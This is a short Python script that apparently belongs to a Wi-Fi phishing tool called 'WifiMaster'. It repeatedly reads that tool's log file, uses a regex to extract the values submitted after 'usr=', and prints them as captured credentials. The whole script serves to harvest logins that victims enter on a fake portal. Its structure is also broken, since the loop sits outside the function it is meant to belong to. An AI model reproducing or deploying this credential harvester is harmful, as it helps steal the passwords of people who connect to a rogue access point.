import re
import time
import os

def findcreds():
	global creds
while True:
	try:
		with open("/opt/WifiMaster/program_files/log.txt", "r") as scan_re:
			result = re.findall("(?:usr=)(.*)(?:HTTP)", scan_re.read())
			line = result
			creds = line
			if "code" in str(creds):
				os.system("clear")
				print("creds = ", creds)
				findcreds()
				time.sleep(4)
				
			else:
				time.sleep(4)
				findcreds()


	except IndexError:
		pass



findcreds()
	




"""
(?:usr=)(.*)(?:HTTP)
"""
